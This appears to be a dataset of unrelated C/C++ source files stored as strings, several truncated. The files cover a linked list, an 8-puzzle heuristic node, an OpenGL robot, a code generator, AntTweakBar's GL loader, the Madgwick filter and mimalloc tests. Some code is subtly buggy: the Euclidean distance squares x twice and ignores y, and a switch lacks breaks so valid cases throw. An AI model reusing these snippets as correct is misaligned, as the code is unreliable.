    "#include <iostream>\n#define MAX 100  //Max size of linkedlist\n\nclass SinglyLinkedList {\nprivate:\n    int arr[MAX];\n    int next[MAX];\n    int head;\n    int freeSpot;\n\npublic:\n    SinglyLinkedList() {\n        head = -1;\n        for (int i = 0; i < MAX - 1; i++) {\n            next[i] = i + 1;  // Initialize next array to point to the next free index\n        }\n        next[MAX - 1] = -1;  // No more free spots\n        freeSpot = 0;  // Free spot to insert new element\n    }\n\n    void insert(int data) {\n        if (freeSpot == -1) {\n            std::cout << \"List Overflow\\n\";\n            return;\n        }\n\n        int index = freeSpot;\n        freeSpot = next[freeSpot];  // Update free spot to next available index\n        arr[index] = data;  // Insert data\n\n        if (head == -1) {\n            head = index;\n            next[index] = -1;\n        } else {\n            int temp = head;\n            while (next[temp] != -1) {\n                temp = next[temp];\n            }\n            next[temp] = index;\n            next[index] = -1;\n        }\n    }\n\n    void display() {\n        if (head == -1) {\n            std::cout << \"List is Empty\\n\";\n            return;\n        }\n\n        int temp = head;\n        while (temp != -1) {\n            std::cout << arr[temp] << \" -> \";\n            temp = next[temp];\n        }\n        std::cout << \"NULL\\n\";\n    }\n};\n",
    "#ifndef NODE_CPP_\n#define NODE_CPP_\n\n#include \"node.h\"\n#include <math.h>\nusing namespace std;\n\n// basic/start config constructor\nNode::Node(vector<int> new_data) {\n        data = new_data;\n        parent = nullptr;\n        fn = gn+hn;\n};\n\n//constructor for expanded nodes\nNode::Node(vector<int> new_data, Node* oldData) {\n        data = new_data;\n        parent = oldData;\n        gn = oldData->gn + 1; // how many are done\n        fn = gn+hn;\n};\n\n//print node data in 8 puzzle format\nvoid Node::printV() {\n    vector<int> v = data;\n    for (int i = 0;i < 9; i++) {\n        cout << \" \" << v.at(i);\n        if(i%3 != 2) {\n            cout << \" \";\n        }\n        else { \n            cout << endl;\n        }\n    }\n    cout << endl;\n};\n\nint Node::misplacedH() {\n    //this->printV();\n    int mh = 0;\n    for (int i = 0; i < data.size(); i++) {\n        if(data.at(i) == 0){\n            mh = mh;\n        }\n        else if (data.at(i) != (i + 1)) {\n            ++mh;\n        }\n    }\n    hn = mh;\n    fn = gn + hn;\n    return mh;\n};\n\n\ndouble Node::euclideanH() {\n    //this->printV();\n    double count = 0;\n    for(int i = 0; i  < data.size(); i++) {\n        count = count + calculateDist(i, data.at(i));\n    }\n    hn = count;\n    fn = gn + hn;\n    return count;\n};\n\n/* for reference\n    vector index:\n    { 0  1  2\n      3  4  5\n      6  7  8 }\n\n    mod values:\n    { 0  1  2 \n      0  1  2\n      0  1  2 }\n    div values:\n    { 0  0  0 \n      1  1  1\n      2  2  2 }\n    \n*/\n\ndouble Node::calculateDist(int currpos, int num) { //give the vector position and the value of the number at that position\n    if(num == 0) num = 9;\n    int currColumn = currpos%3; //column\n    int currRow = currpos/3; // row\n    int goalRow = (num-1)/3;\n    int goalColumn = (num-1)%3;\n\n    double x = currColumn-goalColumn;\n    double y = currRow-goalRow;\n    double dist = pow(x,2) + pow(x,2);\n    dist = sqrt(dist);\n    return dist;\n}\n\n\n#endif //NODE_CPP_\n",
    "#include <GL/glut.h>\n#include <cmath>\n\n#include \"CameraManagement.h\"\n\n#define PaintWhite glColor3f(1, 1, 1);\n\nGLUquadricObj *solids = gluNewQuadric();\n\nfloat headAngle = 0.0f;\nfloat headSpeed = 5.0f;\n\nfloat torsoAngleX = 0;\n\nfloat rightArmAngle = 0;\nfloat leftArmAngle = 0;\nfloat rightLegAngle = 0;\nfloat leftLegAngle = 0;\n\nfloat rightForearmAngle = 0;\nfloat leftForearmAngle = 0;\nfloat rightCalfAngle = 0;\nfloat leftCalfAngle = 0;\n\nfloat rightFootAngle = 0;\nfloat leftFootAngle = 0;\n\nfloat gripperAngle = 0.0f;\nfloat gripperSpeed = 5.0f;\n\nfloat torsoDirection = 1;\n\nvoid init() {\n    glClearColor(0.7f, 0.7f, 0.7f, 0.0f);\n    glEnable(GL_DEPTH_TEST);\n    gluQuadricDrawStyle(solids, GLU_LINE);\n}\n\nvoid drawAxes() {\n    glBegin(GL_LINES);\n\n    glColor3f(1, 0, 0);\n    glVertex3f(0, 0, 0);\n    glVertex3f(50, 0, 0);\n\n    glColor3f(0, 1, 0);\n    glVertex3f(0, 0, 0);\n    glVertex3f(0, 50, 0);\n\n    glColor3f(0, 0, 1);\n    glVertex3f(0, 0, 0);\n    glVertex3f(0, 0, 50);\n\n    glEnd();\n}\n\nvoid drawRobot() {\n\t// Torso\n\tglPushMatrix();\n\tPaintWhite;\n\tglRotatef(torsoAngleX, 1, 0, 0);\n\tglPushMatrix();\n\tglScalef(1.1f, 2, 0.6f);\n\tglutWireCube(4);\n\tglPopMatrix();\n\n\t// Head\n\tglPushMatrix();\n\tPaintWhite;\n\t// glRotatef(90, 0, 1, 0);\n\tglRotatef(headAngle, 0, 1, 0);\n\tglTranslatef(0, 6, 0);\n\tglutWireSphere(1.9f, 8, 8);\n\n\t// Eyes\n\tglPushMatrix();\n\tPaintWhite;\n\n\t// Right Eye\n\tglTranslatef(0.8f, 0.5f, 1.5f);  // Adjust position to be inside the head\n\tglutWireSphere(0.4f, 8, 8);  // Draw right eye\n\n\t// Left Eye\n\tglTranslatef(-1.6f, 0.0f, 0.0f);  // Adjust position for left eye, maintaining the z-offset\n\tglutWireSphere(0.4f, 8, 8);  // Draw left eye\n\n\tglPopMatrix();  // Pop eyes matrix\n\n\tglPushMatrix();\n\tPaintWhite;\n\tglTranslatef(0, 2, 0);\n\tglRotatef(90, 1, 0, 0);\n\tglutWireTorus(0.4, 1.8, 8, 8);\n\n\tglPopMatrix();\n\tglPopMatrix();\n\n    // Right arm\n    glPushMatrix();\n    PaintWhite;\n    glTranslatef(3, 3, 0);\n    glRotatef(90, 1, 0, 0);\n    glRotatef(-rightArmAngle, 1, 0, 0);\n    gluCylinder(solids, 0.7, 0.6, 3, 8, 8);\n    \n    // Right forearm\n    glPushMatrix();\n    PaintWhite;\n    glTranslatef(0, 0, 3);\n    glRotatef(std::min(rightForearmAngle, 0.0f), 1, 0, 0);\n    gluCylinder(solids, 0.6, 0.5, 2.5, 8, 8);\n\n\t// Right hand (structure)\n\tglPushMatrix();\n\tPaintWhite;\n\tglTranslatef(0, 0, 3);\n\tglRotatef(std::min(rightForearmAngle, 0.0f), 1, 0, 0);\n\tglutWireSphere(0.5, 8, 8);\n\tglPopMatrix();\n\n    // Right hand (gripper)\n    glPushMatrix();\n    PaintWhite;\n    glTranslatef(0, 0, 3);\n    glRotatef(-rightForearmAngle / 2, 1, 0, 0);\n\n    glPushMatrix();\n    glTranslatef(0, 0.2, 0.8);\n    glRotatef(90, 0, 0, 1);\n    glRotatef(gripperAngle, 0, 1, 0);\n    glScalef(0.1f, 0.8f, 1.0f);\n    glutWireCube(1.0f);\n    glPopMatrix();\n\n    glPushMatrix();\n    glTranslatef(0, -0.2, 0.8);\n    glRotatef(90, 0, 0, 1);\n    glRotatef(-gripperAngle, 0, 1, 0);\n    glScalef(0.1f, 0.8f, 1.0f);\n    glutWireCube(1.0f);\n    glPopMatrix();\n\n\n    glPopMatrix();\n    glPopMatrix();\n    glPopMatrix();\n\n    // Left arm\n    glPushMatrix();\n    PaintWhite;\n    glTranslatef(-3, 3, 0);\n    glRotatef(90, 1, 0, 0);\n    glRotatef(-leftArmAngle, 1, 0, 0);\n    gluCylinder(solids, 0.7, 0.6, 3, 8, 8);\n\n    // Left forearm\n    glPushMatrix();\n    PaintWhite;\n    glTranslatef(0, 0, 3);\n    glRotatef(std::min(leftForearmAngle, 0.0f), 1, 0, 0);\n    gluCylinder(solids, 0.6, 0.5, 2.5, 8, 8);\n\n\t// Left hand (structure)\n\tglPushMatrix();\n\tPaintWhite;\n\tglTranslatef(0, 0, 3);\n\tglRotatef(std::min(rightForearmAngle, 0.0f), 1, 0, 0);\n\tglutWireSphere(0.5, 8, 8);\n\tglPopMatrix();\n\n    // Left hand (gripper)\n    glPushMatrix();\n    PaintWhite;\n    glTranslatef(0, 0, 3);\n    glRotatef(-leftForearmAngle / 2, 1, 0, 0);\n\n    glPushMatrix();\n    glTranslatef(0, 0.2, 0.8);\n    glRotatef(90, 0, 0, 1);\n    glRotatef(gripperAngle, 0, 1, 0);\n    glScalef(0.1f, 0.8f, 1.0f);\n    glutWireCube(1.0f);\n    glPopMatrix();\n\n    glPushMatrix();\n    glTranslatef(0, -0.2, 0.8);\n    glRotatef(90, 0, 0, 1);\n    glRotatef(-gripperAngle, 0, 1, 0);\n    glScalef(0.1f, 0.8f, 1.0f);\n    glutWireCube(1.0f);\n    glPopMatrix();\n\n    glPopMatrix();\n\n\n    glPopMatrix();\n    glPopMatrix();\n    glPopMatrix();\n\n    // Right leg\n    glPushMatrix();\n    PaintWhite;;\n    glTranslatef(1.2f, -4, 0);\n    glRotatef(90, 1, 0, 0);\n    glRotatef(leftLegAngle, 1, 0, 0);\n    gluCylinder(solids, 1, 0.9, 4, 8, 8);\n\n    // Right calf\n    glPushMatrix();\n    PaintWhite;\n    glTranslatef(0, 0, 4);\n    glRotatef(-std::min(rightCalfAngle, 0.0f), 1, 0, 0);\n    gluCylinder(solids, 0.9, 0.7, 3, 8, 8);\n\n    // Right foot\n    glPushMatrix();\n    PaintWhite;\n    glTranslatef(0, 0.5, 2.7);\n    glRotatef(rightFootAngle, 1, 0, 0);\n    glScalef(1.0f, 2.5f, 1.0f);\n    glutWireCube(1.0f);\n\n    glPopMatrix();\n    glPopMatrix();\n    glPopMatrix();\n\n    // Left leg\n    glPushMatrix();\n    PaintWhite;\n    glTranslatef(-1.2f, -4, 0);\n    glRotatef(90, 1, 0, 0);\n    glRotatef(rightLegAngle, 1, 0, 0);\n    gluCylinder(solids, 1, 0.9, 4, 8, 8);\n\n    // Left calf\n    glPushMatrix();\n    Pain",
    "#include \"Generator.h\"\n\n#include <fstream>\n#include <iostream>\n#include <ostream>\n#include <sstream>\n\nGenerator::Generator(Feature feature, Aggregator aggregator, const std::string &pattern)\n    : feature(feature), aggregator(aggregator), pattern(pattern) {\n}\n\nint Generator::get_default_gf() const {\n    switch (aggregator) {\n        case Max: return this->features.at(this->feature).min_f;\n        case Min: return this->features.at(this->feature).max_f;\n        case Sum: return 0;\n        default: return -1;\n    }\n}\n\nstd::string Generator::generate_function_code(const std::string &function_name, double default_gf, double neutral_f) {\n    std::ofstream file(\"generated_\" + function_name + \".cpp\");\n    std::stringstream ss;\n    ss << \"#include <vector>\\n\"\n        << \"\\n\"\n        << \"void \" << function_name << \"(std::vector<int> series) {\\n\"\n        << \"    double default_gf = \" << default_gf << \";\\n\"\n        << \"    double neutral_f = \" << neutral_f << \";\\n\"\n        << \"\\n\"\n        << \"    Decoration::apply_decorator(series, default_gf, neutral_f);\\n\"\n        << \"}\\n\";\n\n    file << ss.str();\n    file.close();\n\n    return ss.str();\n}\n\nvoid Generator::generate() const {\n    double default_gf = 0;\n    switch (aggregator) {\n        case Max:\n            default_gf = this->features.at(this->feature).min_f;\n            break;\n        case Min:\n            default_gf = this->features.at(this->feature).max_f;\n        case Sum:\n            default_gf = 0;\n        default:\n            throw runtime_error(\"The selected aggregator doesn't exist\");\n    }\n\n    auto neutral_f = this->features.at(this->feature).neutral;\n\n    string function_name = to_string(this->aggregator) + \"_\" + to_string(this->feature) + \"_\" + this->pattern;\n    string code = generate_function_code(function_name, default_gf, neutral_f);\n\n    std::cout << code << std::endl;\n}\n",
    "//  ---------------------------------------------------------------------------\n//\n//  @file       LoadOGL.cpp\n//  @author     Philippe Decaudin\n//  @license    This file is part of the AntTweakBar library.\n//              For conditions of distribution and use, see License.txt\n//\n//  ---------------------------------------------------------------------------\n\n\n#include \"TwPrecomp.h\"\n#include \"LoadOGL.h\"\n\n\n//  ---------------------------------------------------------------------------\n\n#define ANT_NB_OGL_FUNC_MAX 1024\n\nstruct COGLFuncRec\n{\n    const char *    m_Name;\n    GL::PFNOpenGL * m_FuncPtr;\n    COGLFuncRec() : m_Name(NULL), m_FuncPtr(NULL) {}\n};\nCOGLFuncRec g_OGLFuncRec[ANT_NB_OGL_FUNC_MAX];\nint g_NbOGLFunc = 0;\n#if defined(ANT_WINDOWS)\nHMODULE g_OGLModule = NULL;\n#endif\n\n//  ---------------------------------------------------------------------------\n\nANT_GL_IMPL(glAccum)\nANT_GL_IMPL(glAlphaFunc)\nANT_GL_IMPL(glAreTexturesResident)\nANT_GL_IMPL(glArrayElement)\nANT_GL_IMPL(glBegin)\nANT_GL_IMPL(glBindTexture)\nANT_GL_IMPL(glBitmap)\nANT_GL_IMPL(glBlendFunc)\nANT_GL_IMPL(glCallList)\nANT_GL_IMPL(glCallLists)\nANT_GL_IMPL(glClear)\nANT_GL_IMPL(glClearAccum)\nANT_GL_IMPL(glClearColor)\nANT_GL_IMPL(glClearDepth)\nANT_GL_IMPL(glClearIndex)\nANT_GL_IMPL(glClearStencil)\nANT_GL_IMPL(glClipPlane)\nANT_GL_IMPL(glColor3b)\nANT_GL_IMPL(glColor3bv)\nANT_GL_IMPL(glColor3d)\nANT_GL_IMPL(glColor3dv)\nANT_GL_IMPL(glColor3f)\nANT_GL_IMPL(glColor3fv)\nANT_GL_IMPL(glColor3i)\nANT_GL_IMPL(glColor3iv)\nANT_GL_IMPL(glColor3s)\nANT_GL_IMPL(glColor3sv)\nANT_GL_IMPL(glColor3ub)\nANT_GL_IMPL(glColor3ubv)\nANT_GL_IMPL(glColor3ui)\nANT_GL_IMPL(glColor3uiv)\nANT_GL_IMPL(glColor3us)\nANT_GL_IMPL(glColor3usv)\nANT_GL_IMPL(glColor4b)\nANT_GL_IMPL(glColor4bv)\nANT_GL_IMPL(glColor4d)\nANT_GL_IMPL(glColor4dv)\nANT_GL_IMPL(glColor4f)\nANT_GL_IMPL(glColor4fv)\nANT_GL_IMPL(glColor4i)\nANT_GL_IMPL(glColor4iv)\nANT_GL_IMPL(glColor4s)\nANT_GL_IMPL(glColor4sv)\nANT_GL_IMPL(glColor4ub)\nANT_GL_IMPL(glColor4ubv)\nANT_GL_IMPL(glColor4ui)\nANT_GL_IMPL(glColor4uiv)\nANT_GL_IMPL(glColor4us)\nANT_GL_IMPL(glColor4usv)\nANT_GL_IMPL(glColorMask)\nANT_GL_IMPL(glColorMaterial)\nANT_GL_IMPL(glColorPointer)\nANT_GL_IMPL(glCopyPixels)\nANT_GL_IMPL(glCopyTexImage1D)\nANT_GL_IMPL(glCopyTexImage2D)\nANT_GL_IMPL(glCopyTexSubImage1D)\nANT_GL_IMPL(glCopyTexSubImage2D)\nANT_GL_IMPL(glCullFace)\nANT_GL_IMPL(glDeleteLists)\nANT_GL_IMPL(glDeleteTextures)\nANT_GL_IMPL(glDepthFunc)\nANT_GL_IMPL(glDepthMask)\nANT_GL_IMPL(glDepthRange)\nANT_GL_IMPL(glDisable)\nANT_GL_IMPL(glDisableClientState)\nANT_GL_IMPL(glDrawArrays)\nANT_GL_IMPL(glDrawBuffer)\nANT_GL_IMPL(glDrawElements)\nANT_GL_IMPL(glDrawPixels)\nANT_GL_IMPL(glEdgeFlag)\nANT_GL_IMPL(glEdgeFlagPointer)\nANT_GL_IMPL(glEdgeFlagv)\nANT_GL_IMPL(glEnable)\nANT_GL_IMPL(glEnableClientState)\nANT_GL_IMPL(glEnd)\nANT_GL_IMPL(glEndList)\nANT_GL_IMPL(glEvalCoord1d)\nANT_GL_IMPL(glEvalCoord1dv)\nANT_GL_IMPL(glEvalCoord1f)\nANT_GL_IMPL(glEvalCoord1fv)\nANT_GL_IMPL(glEvalCoord2d)\nANT_GL_IMPL(glEvalCoord2dv)\nANT_GL_IMPL(glEvalCoord2f)\nANT_GL_IMPL(glEvalCoord2fv)\nANT_GL_IMPL(glEvalMesh1)\nANT_GL_IMPL(glEvalMesh2)\nANT_GL_IMPL(glEvalPoint1)\nANT_GL_IMPL(glEvalPoint2)\nANT_GL_IMPL(glFeedbackBuffer)\nANT_GL_IMPL(glFinish)\nANT_GL_IMPL(glFlush)\nANT_GL_IMPL(glFogf)\nANT_GL_IMPL(glFogfv)\nANT_GL_IMPL(glFogi)\nANT_GL_IMPL(glFogiv)\nANT_GL_IMPL(glFrontFace)\nANT_GL_IMPL(glFrustum)\nANT_GL_IMPL(glGenLists)\nANT_GL_IMPL(glGenTextures)\nANT_GL_IMPL(glGetBooleanv)\nANT_GL_IMPL(glGetClipPlane)\nANT_GL_IMPL(glGetDoublev)\nANT_GL_IMPL(glGetError)\nANT_GL_IMPL(glGetFloatv)\nANT_GL_IMPL(glGetIntegerv)\nANT_GL_IMPL(glGetLightfv)\nANT_GL_IMPL(glGetLightiv)\nANT_GL_IMPL(glGetMapdv)\nANT_GL_IMPL(glGetMapfv)\nANT_GL_IMPL(glGetMapiv)\nANT_GL_IMPL(glGetMaterialfv)\nANT_GL_IMPL(glGetMaterialiv)\nANT_GL_IMPL(glGetPixelMapfv)\nANT_GL_IMPL(glGetPixelMapuiv)\nANT_GL_IMPL(glGetPixelMapusv)\nANT_GL_IMPL(glGetPointerv)\nANT_GL_IMPL(glGetPolygonStipple)\nANT_GL_IMPL(glGetString)\nANT_GL_IMPL(glGetTexEnvfv)\nANT_GL_IMPL(glGetTexEnviv)\nANT_GL_IMPL(glGetTexGendv)\nANT_GL_IMPL(glGetTexGenfv)\nANT_GL_IMPL(glGetTexGeniv)\nANT_GL_IMPL(glGetTexImage)\nANT_GL_IMPL(glGetTexLevelParameterfv)\nANT_GL_IMPL(glGetTexLevelParameteriv)\nANT_GL_IMPL(glGetTexParameterfv)\nANT_GL_IMPL(glGetTexParameteriv)\nANT_GL_IMPL(glHint)\nANT_GL_IMPL(glIndexMask)\nANT_GL_IMPL(glIndexPointer)\nANT_GL_IMPL(glIndexd)\nANT_GL_IMPL(glIndexdv)\nANT_GL_IMPL(glIndexf)\nANT_GL_IMPL(glIndexfv)\nANT_GL_IMPL(glIndexi)\nANT_GL_IMPL(glIndexiv)\nANT_GL_IMPL(glIndexs)\nANT_GL_IMPL(glIndexsv)\nANT_GL_IMPL(glIndexub)\nANT_GL_IMPL(glIndexubv)\nANT_GL_IMPL(glInitNames)\nANT_GL_IMPL(glInterleavedArrays)\nANT_GL_IMPL(glIsEnabled)\nANT_GL_IMPL(glIsList)\nANT_GL_IMPL(glIsTexture)\nANT_GL_IMPL(glLightModelf)\nANT_GL_IMPL(glLightModelfv)\nANT_GL_IMPL(glLightModeli)\nANT_GL_IMPL(glLightModeliv)\nANT_GL_IMPL(glLightf)\nANT_GL_IMPL(glLightfv)\nANT_GL_IMPL(glLighti)\nANT_GL_IMPL(glLightiv)\nANT_GL_IMPL(glLineStipple)\nANT_GL_IMPL(glLineWidth)\nANT_GL_IMPL(glListBase)\nANT_GL_IMPL(glLoadIdentity)\nANT_GL_IMPL(glLoadMatrixd)\nANT_GL_IMPL(glLoadMatrixf)\nANT_GL_IMPL(glLoadName",
    "//=============================================================================================\r\n// MadgwickAHRS.c\r\n//=============================================================================================\r\n//\r\n// Implementation of Madgwick's IMU and AHRS algorithms.\r\n// See: http://www.x-io.co.uk/open-source-imu-and-ahrs-algorithms/\r\n//\r\n// From the x-io website \"Open-source resources available on this website are\r\n// provided under the GNU General Public Licence unless an alternative licence\r\n// is provided in source.\"\r\n//\r\n// Date\t\t\tAuthor          Notes\r\n// 29/09/2011\tSOH Madgwick    Initial release\r\n// 02/10/2011\tSOH Madgwick\tOptimised for reduced CPU load\r\n// 19/02/2012\tSOH Madgwick\tMagnetometer measurement is normalised\r\n//\r\n//=============================================================================================\r\n\r\n//-------------------------------------------------------------------------------------------\r\n// Header files\r\n\r\n#include \"MadgwickAHRS.h\"\r\n#include <math.h>\r\n\r\n//-------------------------------------------------------------------------------------------\r\n// Definitions\r\n\r\n#define sampleFreqDef   512.0f          // sample frequency in Hz\r\n#define betaDef         0.1f            // 2 * proportional gain\r\n\r\n\r\n//============================================================================================\r\n// Functions\r\n\r\n//-------------------------------------------------------------------------------------------\r\n// AHRS algorithm update\r\n\r\nMadgwick::Madgwick() {\r\n\tbeta = betaDef;\r\n\tq0 = 1.0f;\r\n\tq1 = 0.0f;\r\n\tq2 = 0.0f;\r\n\tq3 = 0.0f;\r\n\tinvSampleFreq = 1.0f / sampleFreqDef;\r\n\tanglesComputed = 0;\r\n}\r\n\r\nvoid Madgwick::update(float gx, float gy, float gz, float ax, float ay, float az, float mx, float my, float mz) {\r\n\tfloat recipNorm;\r\n\tfloat s0, s1, s2, s3;\r\n\tfloat qDot1, qDot2, qDot3, qDot4;\r\n\tfloat hx, hy;\r\n\tfloat _2q0mx, _2q0my, _2q0mz, _2q1mx, _2bx, _2bz, _4bx, _4bz, _2q0, _2q1, _2q2, _2q3, _2q0q2, _2q2q3, q0q0, q0q1, q0q2, q0q3, q1q1, q1q2, q1q3, q2q2, q2q3, q3q3;\r\n\r\n\t// Use IMU algorithm if magnetometer measurement invalid (avoids NaN in magnetometer normalisation)\r\n\tif((mx == 0.0f) && (my == 0.0f) && (mz == 0.0f)) {\r\n\t\tupdateIMU(gx, gy, gz, ax, ay, az);\r\n\t\treturn;\r\n\t}\r\n\r\n\t// Convert gyroscope degrees/sec to radians/sec\r\n\tgx *= 0.0174533f;\r\n\tgy *= 0.0174533f;\r\n\tgz *= 0.0174533f;\r\n\r\n\t// Rate of change of quaternion from gyroscope\r\n\tqDot1 = 0.5f * (-q1 * gx - q2 * gy - q3 * gz);\r\n\tqDot2 = 0.5f * (q0 * gx + q2 * gz - q3 * gy);\r\n\tqDot3 = 0.5f * (q0 * gy - q1 * gz + q3 * gx);\r\n\tqDot4 = 0.5f * (q0 * gz + q1 * gy - q2 * gx);\r\n\r\n\t// Compute feedback only if accelerometer measurement valid (avoids NaN in accelerometer normalisation)\r\n\tif(!((ax == 0.0f) && (ay == 0.0f) && (az == 0.0f))) {\r\n\r\n\t\t// Normalise accelerometer measurement\r\n\t\trecipNorm = invSqrt(ax * ax + ay * ay + az * az);\r\n\t\tax *= recipNorm;\r\n\t\tay *= recipNorm;\r\n\t\taz *= recipNorm;\r\n\r\n\t\t// Normalise magnetometer measurement\r\n\t\trecipNorm = invSqrt(mx * mx + my * my + mz * mz);\r\n\t\tmx *= recipNorm;\r\n\t\tmy *= recipNorm;\r\n\t\tmz *= recipNorm;\r\n\r\n\t\t// Auxiliary variables to avoid repeated arithmetic\r\n\t\t_2q0mx = 2.0f * q0 * mx;\r\n\t\t_2q0my = 2.0f * q0 * my;\r\n\t\t_2q0mz = 2.0f * q0 * mz;\r\n\t\t_2q1mx = 2.0f * q1 * mx;\r\n\t\t_2q0 = 2.0f * q0;\r\n\t\t_2q1 = 2.0f * q1;\r\n\t\t_2q2 = 2.0f * q2;\r\n\t\t_2q3 = 2.0f * q3;\r\n\t\t_2q0q2 = 2.0f * q0 * q2;\r\n\t\t_2q2q3 = 2.0f * q2 * q3;\r\n\t\tq0q0 = q0 * q0;\r\n\t\tq0q1 = q0 * q1;\r\n\t\tq0q2 = q0 * q2;\r\n\t\tq0q3 = q0 * q3;\r\n\t\tq1q1 = q1 * q1;\r\n\t\tq1q2 = q1 * q2;\r\n\t\tq1q3 = q1 * q3;\r\n\t\tq2q2 = q2 * q2;\r\n\t\tq2q3 = q2 * q3;\r\n\t\tq3q3 = q3 * q3;\r\n\r\n\t\t// Reference direction of Earth's magnetic field\r\n\t\thx = mx * q0q0 - _2q0my * q3 + _2q0mz * q2 + mx * q1q1 + _2q1 * my * q2 + _2q1 * mz * q3 - mx * q2q2 - mx * q3q3;\r\n\t\thy = _2q0mx * q3 + my * q0q0 - _2q0mz * q1 + _2q1mx * q2 - my * q1q1 + my * q2q2 + _2q2 * mz * q3 - my * q3q3;\r\n\t\t_2bx = sqrtf(hx * hx + hy * hy);\r\n\t\t_2bz = -_2q0mx * q2 + _2q0my * q1 + mz * q0q0 + _2q1mx * q3 - mz * q1q1 + _2q2 * my * q3 - mz * q2q2 + mz * q3q3;\r\n\t\t_4bx = 2.0f * _2bx;\r\n\t\t_4bz = 2.0f * _2bz;\r\n\r\n\t\t// Gradient decent algorithm corrective step\r\n\t\ts0 = -_2q2 * (2.0f * q1q3 - _2q0q2 - ax) + _2q1 * (2.0f * q0q1 + _2q2q3 - ay) - _2bz * q2 * (_2bx * (0.5f - q2q2 - q3q3) + _2bz * (q1q3 - q0q2) - mx) + (-_2bx * q3 + _2bz * q1) * (_2bx * (q1q2 - q0q3) + _2bz * (q0q1 + q2q3) - my) + _2bx * q2 * (_2bx * (q0q2 + q1q3) + _2bz * (0.5f - q1q1 - q2q2) - mz);\r\n\t\ts1 = _2q3 * (2.0f * q1q3 - _2q0q2 - ax) + _2q0 * (2.0f * q0q1 + _2q2q3 - ay) - 4.0f * q1 * (1 - 2.0f * q1q1 - 2.0f * q2q2 - az) + _2bz * q3 * (_2bx * (0.5f - q2q2 - q3q3) + _2bz * (q1q3 - q0q2) - mx) + (_2bx * q2 + _2bz * q0) * (_2bx * (q1q2 - q0q3) + _2bz * (q0q1 + q2q3) - my) + (_2bx * q3 - _4bz * q1) * (_2bx * (q0q2 + q1q3) + _2bz * (0.5f - q1q1 - q2q2) - mz);\r\n\t\ts2 = -_2q0 * (2.0f * q1q3 - _2q0q2 - ax) + _2q3 * (2.0f * q0q1 + _2q2q3 - ay) - 4.0f * q2 * (1 - 2.0f * q1q1 - 2.0f * q2q2 - az) + (-_4bx * q2 - _2bz * q0) * (_2bx * (0.5f - q2q2 - q3q3) + _2bz * (q1q3 - q0q2) - mx) + ",
    "#include <stdlib.h>\n#include <stdio.h>\n#include <assert.h>\n#include <string.h>\n#include <stdint.h>\n\n#include <mimalloc.h>\n#include <new>\n#include <vector>\n#include <future>\n#include <iostream>\n\n#include <thread>\n#include <mimalloc.h>\n#include <assert.h>\n\n#ifdef _WIN32\n#include <mimalloc-new-delete.h>\n#endif\n\n#ifdef _WIN32\n#include <Windows.h>\nstatic void msleep(unsigned long msecs) { Sleep(msecs); }\n#else\n#include <unistd.h>\nstatic void msleep(unsigned long msecs) { usleep(msecs * 1000UL); }\n#endif\n\nstatic void heap_thread_free_large(); // issue #221\nstatic void heap_no_delete();         // issue #202\nstatic void heap_late_free();         // issue #204\nstatic void padding_shrink();         // issue #209\nstatic void various_tests();\nstatic void test_mt_shutdown();\nstatic void large_alloc(void);        // issue #363\nstatic void fail_aslr();              // issue #372\nstatic void tsan_numa_test();         // issue #414\nstatic void strdup_test();            // issue #445 \nstatic void bench_alloc_large(void);  // issue #xxx\n//static void test_large_migrate(void); // issue #691\nstatic void heap_thread_free_huge();\nstatic void test_std_string();        // issue #697\n\nstatic void test_stl_allocators();\n\n\nint main() {\n  // mi_stats_reset();  // ignore earlier allocations\n  \n  // test_std_string();\n  // heap_thread_free_huge();\n  /*\n   heap_thread_free_huge();\n   heap_thread_free_large();\n   heap_no_delete();\n   heap_late_free();\n   padding_shrink();\n   various_tests();\n   large_alloc();\n   tsan_numa_test();\n   strdup_test();\n  */\n  // test_stl_allocators();\n  // test_mt_shutdown();\n  // test_large_migrate();\n  \n  //fail_aslr();\n  // bench_alloc_large();\n  // mi_stats_print(NULL);\n  return 0;\n}\n\nstatic void* p = malloc(8);\n\nvoid free_p() {\n  free(p);\n  return;\n}\n\nclass Test {\nprivate:\n  int i;\npublic:\n  Test(int x) { i = x; }\n  ~Test() { }\n};\n\n\nstatic void various_tests() {\n  atexit(free_p);\n  void* p1 = malloc(78);\n  void* p2 = mi_malloc_aligned(24, 16);\n  free(p1);\n  p1 = malloc(8);\n  char* s = mi_strdup(\"hello\\n\");\n\n  mi_free(p2);\n  p2 = malloc(16);\n  p1 = realloc(p1, 32);\n  free(p1);\n  free(p2);\n  mi_free(s);\n\n  Test* t = new Test(42);\n  delete t;\n  t = new (std::nothrow) Test(42);\n  delete t;\n  auto tbuf = new unsigned char[sizeof(Test)];\n  t = new (tbuf) Test(42);\n  t->~Test();\n  delete[] tbuf;\n}\n\nclass Static {\nprivate:\n  void* p;\npublic:\n  Static() {\n    p = malloc(64);\n    return;\n  }\n  ~Static() {\n    free(p);\n    return;\n  }\n};\n\nstatic Static s = Static();\n\n\nstatic bool test_stl_allocator1() {\n  std::vector<int, mi_stl_allocator<int> > vec;\n  vec.push_back(1);\n  vec.pop_back();\n  return vec.size() == 0;\n}\n\nstruct some_struct { int i; int j; double z; };\n\nstatic bool test_stl_allocator2() {\n  std::vector<some_struct, mi_stl_allocator<some_struct> > vec;\n  vec.push_back(some_struct());\n  vec.pop_back();\n  return vec.size() == 0;\n}\n\n#if MI_HAS_HEAP_STL_ALLOCATOR\nstatic bool test_stl_allocator3() {\n  std::vector<int, mi_heap_stl_allocator<int> > vec;\n  vec.push_back(1);\n  vec.pop_back();\n  return vec.size() == 0;\n}\n\nstatic bool test_stl_allocator4() {\n  std::vector<some_struct, mi_heap_stl_allocator<some_struct> > vec;\n  vec.push_back(some_struct());\n  vec.pop_back();\n  return vec.size() == 0;\n}\n\nstatic bool test_stl_allocator5() {\n  std::vector<int, mi_heap_destroy_stl_allocator<int> > vec;\n  vec.push_back(1);\n  vec.pop_back();\n  return vec.size() == 0;\n}\n\nstatic bool test_stl_allocator6() {\n  std::vector<some_struct, mi_heap_destroy_stl_allocator<some_struct> > vec;\n  vec.push_back(some_struct());\n  vec.pop_back();\n  return vec.size() == 0;\n}\n#endif\n\nstatic void test_stl_allocators() {\n  test_stl_allocator1();\n  test_stl_allocator2();\n#if MI_HAS_HEAP_STL_ALLOCATOR\n  test_stl_allocator3();\n  test_stl_allocator4();\n  test_stl_allocator5();\n  test_stl_allocator6();\n#endif\n}\n\n#if 0\n// issue #691\nstatic char* cptr;\n\nstatic void* thread1_allocate()\n{\n  cptr = mi_calloc_tp(char,22085632);\n  return NULL;\n}\n\nstatic void* thread2_free()\n{\n  assert(cptr);\n  